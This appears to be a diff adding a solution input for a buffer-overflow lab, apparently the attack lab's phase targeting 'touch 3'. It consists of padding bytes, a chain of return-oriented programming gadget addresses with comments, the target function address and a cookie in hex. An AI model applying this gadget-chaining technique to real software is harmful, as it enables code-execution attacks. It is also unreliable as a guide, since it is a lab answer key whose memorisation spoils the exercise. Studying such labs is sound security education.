@@ -1,0 +1,14 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00  /* end buffer */
+2f 17 40 00 00 00 00 00  /* move rsp into rax 4889e0c3 */
+97 16 40 00 00 00 00 00  /* move rax into rdi 4889c7c3 */
+8a 16 40 00 00 00 00 00  /* pop rax func addr 58909090c3 */
+48 00 00 00 00 00 00 00  /* constant to add to rsp address */
+f4 16 40 00 00 00 00 00  /* move eax to edx 89c218dbc3 */
+60 17 40 00 00 00 00 00  /* move edx to ecx 89d19090c3 */
+21 17 40 00 00 00 00 00  /* move ecx to esi 89ce90c3 */
+c4 16 40 00 00 00 00 00  /* rsi+rdi into rax 488d0437 */
+97 16 40 00 00 00 00 00  /* move rax to rdi */
+e5 15 40 00 00 00 00 00  /* address of touch 3 */
+37 38 39 36 30 31 37 33 00  /* cookie in hex */
